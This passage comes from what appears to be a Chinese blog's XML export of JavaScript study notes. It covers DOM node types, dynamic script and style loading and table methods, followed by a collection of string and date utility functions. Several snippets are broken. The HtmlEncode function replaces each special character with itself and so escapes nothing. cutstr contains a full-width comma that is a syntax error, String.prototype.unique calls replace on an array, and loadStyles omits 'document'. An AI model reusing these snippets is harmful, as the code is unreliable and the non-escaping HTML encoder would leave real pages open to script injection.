class="comment">//"Hello"</span></span><br><span class="line">alert(newNode.nodeValue);               <span class="comment">//" world!"</span></span><br><span class="line">alert(element.childNodes.length);       <span class="comment">//2</span></span><br></pre></td></tr></table></figure>
<p>分割文本节点是从文本节点中提取数据的一种常用DOM解析技术。</p>
<!-- * * *

#### `Comment` 类型

#### `CDATASection` 类型

#### `DocumentType` 类型 -->
<hr />
<h4 id="documentfragment-类型"><a class="markdownIt-Anchor" href="#documentfragment-类型"></a> <code>DocumentFragment</code> 类型</h4>
<p>在所有节点类型中，只有DocumentFragment在文档中没有对应的标记。DOM规定文档片段（document fragment）是一种“轻量级”的文档，可以包含和控制节点，但不会像完整的文档那样占用额外的资源。DocumentFragment节点具有下列特征：</p>
<ul>
<li>nodeType的值为11；</li>
<li>nodeName的值为&quot;#document-fragment&quot;；</li>
<li>nodeValue的值为null；</li>
<li>parentNode的值为null；</li>
<li>子节点可以是Element、ProcessingInstruction、Comment、Text、CDATASection或EntityReference。</li>
</ul>
<p>虽然不能把文档片段直接添加到文档中，但可以将它作为一个“仓库”来使用，即可以在里面保存将来可能会添加到文档中的节点。</p>
<p>要创建文档片段，可以使用 <code>document.createDocumentFragment()</code> 方法。</p>
<p>文档片段继承了Node的所有方法，通常用于执行那些针对文档的DOM操作。<em>如果将文档中的节点添加到文档片段中，就会从文档树中移除该节点</em>，也不会从浏览器中再看到该节点。添加到文档片段中的新节点同样也不属于文档树。可以通过appendChild()或insertBefore()将文档片段中内容添加到文档中。在将文档片段作为参数传递给这两个方法时，实际上只会将文档片段的所有子节点添加到相应位置上；文档片段本身永远不会成为文档树的一部分。</p>
<p>来看下面的HTML示例代码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">"myList"</span>&gt;</span><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>假设我们想为这个<code>&lt;ul&gt;</code>元素添加3个列表项。如果逐个地添加列表项，将会导致浏览器<strong>反复渲染</strong>（呈现）新信息。为<strong>避免</strong>这个问题，可以像下面这样使用一个文档片段来保存创建的列表项，然后再一次性将它们添加到文档中。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fragment = <span class="built_in">document</span>.createDocumentFragment();</span><br><span class="line"><span class="keyword">var</span> ul = <span class="built_in">document</span>.getElementById(<span class="string">"myList"</span>);</span><br><span class="line"><span class="keyword">var</span> li = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">3</span>; i++)&#123;</span><br><span class="line">    li = <span class="built_in">document</span>.createElement(<span class="string">"li"</span>);</span><br><span class="line">    li.appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"Item "</span> + (i+<span class="number">1</span>)));</span><br><span class="line">    fragment.appendChild(li);</span><br><span class="line">&#125;</span><br><span class="line">ul.appendChild(fragment);</span><br></pre></td></tr></table></figure>
<h4 id="attr-类型"><a class="markdownIt-Anchor" href="#attr-类型"></a> <code>Attr</code> 类型</h4>
<hr />
<h3 id="dom操作技术"><a class="markdownIt-Anchor" href="#dom操作技术"></a> DOM操作技术</h3>
<h4 id="动态脚本"><a class="markdownIt-Anchor" href="#动态脚本"></a> 动态脚本</h4>
<p><strong>加载外部脚本文件</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScript</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">  script.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">  script.src = url;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadScript(<span class="string">"client.js"</span>);</span><br></pre></td></tr></table></figure>
<p><strong>加载行内脚本</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadScriptString</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">  script.type = <span class="string">"text/javascript"</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    script.appendChild(<span class="built_in">document</span>.createTextNode(code));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (ex)&#123;</span><br><span class="line">    script.text = code;   <span class="comment">// 兼容IE</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadScriptString(<span class="string">"function sayHi()&#123;alert('hi');&#125;"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="动态样式"><a class="markdownIt-Anchor" href="#动态样式"></a> 动态样式</h4>
<p><strong>加载外部样式文件</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadStyles</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> link = <span class="built_in">document</span>.createElement(<span class="string">'link'</span>);</span><br><span class="line">  link.rel = <span class="string">"stylesheet"</span>;</span><br><span class="line">  link.type = <span class="string">"text/css"</span>;</span><br><span class="line">  link.href = url;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> head = getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">  head.appendChild(link);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadStyles(<span class="string">"styles.css"</span>);</span><br></pre></td></tr></table></figure>
<p><strong>加载行内样式</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loadStylesString</span>(<span class="params">css</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> style = <span class="built_in">document</span>.createElement(<span class="string">'style'</span>);</span><br><span class="line">  style.type = <span class="string">"text/css"</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    style.appendChild(<span class="built_in">document</span>.createTextNode(css))</span><br><span class="line">  &#125; <span class="keyword">catch</span> (ex)&#123;</span><br><span class="line">    style.styleSheet.cssText = css;  <span class="comment">//兼容IE</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> head = getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>];</span><br><span class="line">  head.appendChild(style);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">loadStylesString(<span class="string">"body&#123;background-color:#333;&#125;"</span>);</span><br></pre></td></tr></table></figure>
<h4 id="操作表格"><a class="markdownIt-Anchor" href="#操作表格"></a> 操作表格</h4>
<p>用核心DOM方法创建表格通常代码很长且不太清晰，因而为了方便构建表格，HTML、DOM还为 <code>&lt;table&gt;</code>、<code>&lt;tbody&gt;</code>和<code>&lt;tr&gt;</code>元素添加了一些属性和方法。</p>
<ul>
<li>
<p>为 <code>&lt;table&gt;</code> 元素添加的属性和方法如下:</p>
<ul>
<li><code>caption</code>：保存着对 <code>&lt;caption&gt;</code> 元素（如果有）的指针。</li>
<li><code>tBodies</code>：是一个 <code>&lt;tbody&gt;</code> 元素的 HTMLCollection。</li>
<li><code>tFoot</code>：保存着对 <code>&lt;tfoot&gt;</code> 元素（如果有）的指针。</li>
<li><code>tHead</code>：保存着对 <code>&lt;thead&gt;</code> 元素（如果有）的指针。</li>
<li><code>rows</code>：是一个表格中所有行的 HTMLCollection。</li>
<li><code>createTHead()</code>：创建 <code>&lt;thead&gt;</code> 元素，将其放到表格中，返回引用。</li>
<li><code>createTFoot()</code>：创建 <code>&lt;tfoot&gt;</code> 元素，将其放到表格中，返回引用。</li>
<li><code>createCaption()</code>：创建 <code>&lt;caption&gt;</code> 元素，将其放到表格中，返回引用。</li>
<li><code>deleteTHead()</code>：删除<thead>元素。</li>
<li><code>deleteTFoot()</code>：删除<tfoot>元素。</li>
<li><code>deleteCaption()</code>：删除<caption>元素。</li>
<li><code>deleteRow(_pos_)</code>：删除指定位置的行。</li>
<li><code>insertRow(_pos_)</code>：向 <code>rows</code> 集合中的指定位置插入一行。</li>
</ul>
</li>
<li>
<p>为<code>&lt;tbody&gt;</code>元素添加的属性和方法如下：</p>
<ul>
<li><code>rows</code>：保存着<code>&lt;tbody&gt;</code>元素中行的HTMLCollection。</li>
<li><code>deleteRow(pos)</code>：删除指定位置的行。</li>
<li><code>insertRow(pos)</code>：向rows集合中的指定位置插入一行，返回对新插入行的引用。</li>
</ul>
</li>
<li>
<p>为<code>&lt;tr&gt;</code>元素添加的属性和方法如下：</p>
<ul>
<li><code>cells</code>：保存着 <code>&lt;tr&gt;</code> 元素中单元格的 HTMLCollection。</li>
<li><code>deleteCell(pos)</code>：删除指定位置的单元格。</li>
<li><code>insertCell(pos)</code>：向 <code>cells</code> 集合中的指定位置插入一个单元格，返回对新插入单元格的引用。</li>
</ul>
</li>
</ul>
<p><strong>生成一个两行三列表格</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建表格元素</span></span><br><span class="line"><span class="keyword">var</span> table = <span class="built_in">document</span>.createElement(<span class="string">'table'</span>);</span><br><span class="line">table.border=<span class="number">1</span>;</span><br><span class="line">table.width = <span class="string">'100%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建tbody</span></span><br><span class="line"><span class="keyword">var</span> tbody = <span class="built_in">document</span>.createElement(<span class="string">'tbody'</span>);</span><br><span class="line">table.appendChild(tbody);</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建第一行</span></span><br><span class="line">tbody.insertRow(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">1</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'1.1'</span>));</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">1</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'1.2'</span>));</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">2</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'1.3'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建第二行</span></span><br><span class="line">tbody.insertRow(<span class="number">1</span>);</span><br><span class="line">tbody.rows[<span class="number">1</span>].insertCell(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">1</span>].insertCell(<span class="number">1</span>);</span><br><span class="line">tbody.rows[<span class="number">1</span>].insertCell(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">tbody.rows[<span class="number">1</span>].cells[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'2.1'</span>));</span><br><span class="line">tbody.rows[<span class="number">1</span>].cells[<span class="number">1</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'2.2'</span>));</span><br><span class="line">tbody.rows[<span class="number">1</span>].cells[<span class="number">2</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">'2.3'</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">//将表格添加到页面中</span></span><br><span class="line"><span class="built_in">document</span>.body.appendChild(table);</span><br></pre></td></tr></table></figure>
<!-- #### 使用NodeList -->
<h3 id="小结"><a class="markdownIt-Anchor" href="#小结"></a> 小结</h3>
<p>DOM是语言中立的API，用于访问和操作HTML和XML文档。DOM1级将HTML和XML文档形象地看作一个层次化的节点树，可以使用JavaScript来操作这个节点树，进而改变底层文档的外观和结构。</p>
<p>DOM由各种节点构成，简要总结如下：</p>
<ul>
<li>最基本的节点类型是 <code>Node</code>，用于抽象地表示文档中一个独立的部分；所有其他类型都继承自Node。</li>
<li><code>Document</code> 类型表示整个文档，是一组分层节点的根节点。在 JavaScript 中，<code>document</code> 对象是 <code>Document</code> 的一个实例。使用 <code>document</code> 对象，有很多种方式可以查询和取得节点。</li>
<li><code>Element</code> 节点表示文档中的所有 HTML或XML 元素，可以用来操作这些元素的内容和特性。</li>
<li>另外还有一些节点类型，分别表示文本内容、注释、文档类型、CDATA区域和文档片段。</li>
</ul>
<p>访问 DOM 的操作在多数情况下都很直观，不过在处理 <code>&lt;script&gt;</code>和<code>&lt;style&gt;</code> 元素时还是存在一些复杂性。由于这两个元素分别包含脚本和样式信息，因此浏览器通常会将它们与其他元素区别对待。这些区别导致了在针对这些元素使用innerHTML时，以及在创建新元素时的一些问题。</p>
<p>理解DOM的关键，就是理解DOM对性能的影响。DOM操作往往是JavaScript程序中开销最大的部分，而因访问NodeList导致的问题为最多。NodeList对象都是“动态的”，这就意味着每次访问NodeList对象，都会运行一次查询。有鉴于此，最好的办法就是尽量减少DOM操作。</p>
]]></content>
      <categories>
        <category>JavaScript</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>dom</tag>
      </tags>
  </entry>
  <entry>
    <title>Javascript常用方法函数收集</title>
    <url>/hexolog/post/30fd5d95.html</url>
    <content><![CDATA[<h2 id="字符串及数组类"><a class="markdownIt-Anchor" href="#字符串及数组类"></a> 字符串及数组类</h2>
<h3 id="判断一个字符串中出现次数最多的字符统计这个次数"><a class="markdownIt-Anchor" href="#判断一个字符串中出现次数最多的字符统计这个次数"></a> 判断一个字符串中出现次数最多的字符，统计这个次数</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> str = <span class="string">"zhaochucichuzuiduodezifu"</span>;</span><br><span class="line"><span class="keyword">var</span> o = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, length = str.length; i &lt; length; i++) &#123;</span><br><span class="line"><span class="comment">//        var char = str[i];</span></span><br><span class="line">    <span class="keyword">var</span> char = str.charAt(i);</span><br><span class="line">    <span class="keyword">if</span> (o[char]) &#123;  <span class="comment">//char就是对象o的一个属性，o[char]是属性值，o[char]控制出现的次数</span></span><br><span class="line">        o[char]++;  <span class="comment">//次数加1</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        o[char] = <span class="number">1</span>;    <span class="comment">//若第一次出现，次数记为1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o);   <span class="comment">//输出的是完整的对象，记录着每一个字符及其出现的次数</span></span><br><span class="line"><span class="comment">//遍历对象，找到出现次数最多的字符和次数</span></span><br><span class="line"><span class="keyword">var</span> max = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">var</span> maxChar = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> o) &#123;</span><br><span class="line">    <span class="keyword">if</span> (max &lt; o[key]) &#123;</span><br><span class="line">        max = o[key];   <span class="comment">//max始终储存次数最大的那个</span></span><br><span class="line">        maxChar = key;  <span class="comment">//那么对应的字符就是当前的key</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"最多的字符是"</span> + maxChar);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"出现的次数是"</span> + max);</span><br></pre></td></tr></table></figure>
<h3 id="字符串长度截取"><a class="markdownIt-Anchor" href="#字符串长度截取"></a> 字符串长度截取</h3>
<a id="more"></a>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cutstr</span>(<span class="params">str, len</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> temp,</span><br><span class="line">    icount = <span class="number">0</span>,</span><br><span class="line">    patrn = <span class="regexp">/[^\x00-\xff]/</span>，</span><br><span class="line">    strre = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; str.length; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (icount &lt; len - <span class="number">1</span>) &#123;</span><br><span class="line">        temp = str.substr(i, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (patrn.exec(temp) == <span class="literal">null</span>) &#123;</span><br><span class="line">               icount = icount + <span class="number">1</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            icount = icount + <span class="number">2</span></span><br><span class="line">        &#125;</span><br><span class="line">        strre += temp</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> strre + <span class="string">"..."</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="替换全部"><a class="markdownIt-Anchor" href="#替换全部"></a> 替换全部</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.replaceAll = <span class="function"><span class="keyword">function</span>(<span class="params">s1, s2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(<span class="keyword">new</span> <span class="built_in">RegExp</span>(s1, <span class="string">"gm"</span>), s2)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="清除相同的数组"><a class="markdownIt-Anchor" href="#清除相同的数组"></a> 清除相同的数组</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.unique=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> x=<span class="keyword">this</span>.split(<span class="regexp">/[\r\n]+/</span>);</span><br><span class="line">    <span class="keyword">var</span> y=<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;x.length;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"^"</span>+x.replace(<span class="regexp">/([^\w])/ig</span>,<span class="string">"\\$1"</span>)+<span class="string">"$"</span>,<span class="string">"igm"</span>).test(y))&#123;</span><br><span class="line">            y+=x+<span class="string">"\r\n"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> y</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="按字母排序对每行进行数组排序"><a class="markdownIt-Anchor" href="#按字母排序对每行进行数组排序"></a> 按字母排序，对每行进行数组排序</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">SetSort</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> text=K1.value.split(<span class="regexp">/[\r\n]/</span>).sort().join(<span class="string">"\r\n"</span>);<span class="comment">//顺序</span></span><br><span class="line">    <span class="keyword">var</span> test=K1.value.split(<span class="regexp">/[\r\n]/</span>).sort().reverse().join(<span class="string">"\r\n"</span>);<span class="comment">//反序</span></span><br><span class="line">    K1.value=K1.value!=text?text:test;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="字符串反序"><a class="markdownIt-Anchor" href="#字符串反序"></a> 字符串反序</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">IsReverse</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> text.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="清除空格"><a class="markdownIt-Anchor" href="#清除空格"></a> 清除空格</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.trim = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> reExtraSpace = <span class="regexp">/^\s*(.*?)\s+$/</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.replace(reExtraSpace, <span class="string">"$1"</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="清空左右空格"><a class="markdownIt-Anchor" href="#清空左右空格"></a> 清空左/右空格</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ltrim</span>(<span class="params">s</span>)</span>&#123; <span class="keyword">return</span> s.replace( <span class="regexp">/^(\s*|　*)/</span>, <span class="string">""</span>); &#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rtrim</span>(<span class="params">s</span>)</span>&#123; <span class="keyword">return</span> s.replace( <span class="regexp">/(\s*|　*)$/</span>, <span class="string">""</span>); &#125;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否以某个字符串开头"><a class="markdownIt-Anchor" href="#判断是否以某个字符串开头"></a> 判断是否以某个字符串开头</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.startWith = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.indexOf(s) == <span class="number">0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="判断是否以某个字符串结束"><a class="markdownIt-Anchor" href="#判断是否以某个字符串结束"></a> 判断是否以某个字符串结束</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">String</span>.prototype.endWith = <span class="function"><span class="keyword">function</span> (<span class="params">s</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> d = <span class="keyword">this</span>.length - s.length;</span><br><span class="line">    <span class="keyword">return</span> (d &gt;= <span class="number">0</span> &amp;&amp; <span class="keyword">this</span>.lastIndexOf(s) == d)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="转义html标签"><a class="markdownIt-Anchor" href="#转义html标签"></a> 转义html标签</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HtmlEncode</span>(<span class="params">text</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> text.replace(<span class="regexp">/&amp;/g</span>, <span class="string">'&amp;'</span>).replace(<span class="regexp">/\"/g</span>, <span class="string">'"'</span>).replace(<span class="regexp">/&lt;/g</span>, <span class="string">'&lt;'</span>).replace(<span class="regexp">/&gt;/g</span>, <span class="string">'&gt;'</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li></li>
</ul>
<h2 id="日期类"><a class="markdownIt-Anchor" href="#日期类"></a> 日期类</h2>
<h3 id="时间日期格式转换"><a class="markdownIt-Anchor" href="#时间日期格式转换"></a> 时间日期格式转换</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.prototype.Format = <span class="function"><span class="keyword">function</span>(<span class="params">formatStr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> str = formatStr;</span><br><span class="line">    <span class="keyword">var</span> Week = [<span class="string">'日'</span>, <span class="string">'一'</span>, <span class="string">'二'</span>, <span class="string">'三'</span>, <span class="string">'四'</span>, <span class="string">'五'</span>, <span class="string">'六'</span>];</span><br><span class="line">    str = str.replace(<span class="regexp">/yyyy|YYYY/</span>, <span class="keyword">this</span>.getFullYear());</span><br><span class="line">    str = str.replace(<span class="regexp">/yy|YY/</span>, (<span class="keyword">this</span>.getYear() % <span class="number">100</span>) &gt; <span class="number">9</span> ? (<span class="keyword">this</span>.getYear() % <span class="number">100</span>).toString() : <span class="string">'0'</span> + (<span class="keyword">this</span>.getYear() % <span class="number">100</span>));</span><br><span class="line">    str = str.replace(<span class="regexp">/MM/</span>, (<span class="keyword">this</span>.getMonth() + <span class="number">1</span>) &gt; <span class="number">9</span> ? (<span class="keyword">this</span>.getMonth() + <span class="number">1</span>).toString() : <span class="string">'0'</span> + (<span class="keyword">this</span>.getMonth() + <span class="number">1</span>));</span><br><span class="line">    str = str.replace(<span class="regexp">/M/g</span>, (<span class="keyword">this</span>.getMonth() + <span class="number">1</span>));</span><br><span class="line">    str = str.replace(<span class="regexp">/w|W/g</span>, Week[<span class="keyword">this</span>.getDay()]);</span><br><span class="line">    str = str.replace(<span class="regexp">/dd|DD/</span>, <span class="keyword">this</span>.getDate() &gt; <span class="number">9</span> ? <span class="keyword">this</span>.getDate().toString() : <span class="string">'0'</span> + <span class="keyword">this</span>.getDate());</span><br><span class="line">    str = str.replace(<span class="regexp">/d|D/g</span>, <span class="keyword">this</span>.getDate());</span><br><span class="line">    str = str.replace(<span class="regexp">/hh|HH/</span>, <span class="keyword">this</span>.getHours() &gt; <span class="number">9</span> ? <span class="keyword">this</span>.getHours().toString() : <span class="string">'0'</span> + <span class="keyword">this</span>.getHours());</span><br><span class="line">    str = str.replace(<span class="regexp">/h|H/g</span>, <span class="keyword">this</span>.getHours());</span><br><span class="line">    str = str.replace(<span class="regexp">/mm/</span>, <span class="keyword">this</span>.getMinutes() &gt; <span class="number">9</span> ? <span class="keyword">this</span>.getMinutes().toString() : <span class="string">'0'</span> + <span class="keyword">this</span>.getMinutes());</span><br><span class="line">    str = str.replace(<span class="regexp">/m/g</span>, <span class="keyword">this</span>.getMinutes());</span><br><span class="line">    str = str.replace(<span class="regexp">/ss|SS/</span>, <span class="keyword">this</span>.getSeconds() &gt; <span class="number">9</span> ? <span class="keyword">this</span>.getSeconds().toString() : <span class="string">'0'</span> + <span class="keyword">this</span>.getSeconds());</span><br><span class="line">    str = str.replace(<span class="regexp">/s|S/g</span>, <span class="keyword">this</span>.getSeconds());</span><br><span class="line">    <span class="keyword">return</span> str</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="日期格式化函数调用方法"><a class="markdownIt-Anchor" href="#日期格式化函数调用方法"></a> 日期格式化函数+调用方法</h3>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Date</span>.prototype.format = <span class="function"><span class="keyword">function</span>(<span class="params">format</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> o = &#123;</span><br><span class="line">        <span class="string">"M+"</span> : <span class="keyword">this</span>.getMonth()+<span class="number">1</span>, <span class="comment">//month</span></span><br><span class="line">        <span class="string">"d+"</span> : <span class="keyword">this</span>.getDate(),    <span class="comment">//day</span></span><br><span class="line">        <span class="string">"h+"</span> : <span class="keyword">this</span>.getHours(),   <span class="comment">//hour</span></span><br><span class="line">        <span class="string">"m+"</span> : <span class="keyword">this</span>.getMinutes(), <span class="comment">//minute</span></span><br><span class="line">        <span class="string">"s+"</span> : <span class="keyword">this</span>.getSeconds(), <span class="comment">//second</span></span><br><span class="line">        <span class="string">"q+"</span> : <span class="built_in">Math</span>.floor((<span class="keyword">this</span>.getMonth()+<span class="number">3</span>)/<span class="number">3</span>),  <span class="comment">//quarter</span></span><br><span class="line">        <span class="string">"S"</span> : <span class="keyword">this</span>.getMilliseconds() <span class="comment">//millisecond</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span>(<span class="regexp">/(y+)/</span>.test(format)) format=format.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>,</span><br><span class="line">(<span class="keyword">this</span>.getFullYear()+<span class="string">""</span>).substr(<span class="number">4</span> - <span class="built_in">RegExp</span>.$<span class="number">1.</span>length));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> k <span class="keyword">in</span> o)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">"("</span>+ k +<span class="string">")"</span>).test(format))</span><br><span class="line">            format = format.replace(<span class="built_in">RegExp</span>.$<span class="number">1</span>,<span class="built_in">RegExp</span>.$<span class="number">1.</span>length==<span class="number">1</span> ? o[k] :(<span class="string">"00"</span>+ o[k]).substr((<span class="string">""</span>+ o[k]).length));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> format;</span><br><span class="line">&#125;</span><br><span class="line">alert(<span class="keyword">new</span> <span class="built_in">Date</span>().format(<span class="string">"yyyy-MM-dd hh:mm:ss"</span>));</span><br></pre></td></tr></table></figure>
<h3 id="时间个性化输出功能"><a class="markdownIt-Anchor" href="#时间个性化输出功能"></a> 时间个性化输出功能</h3>
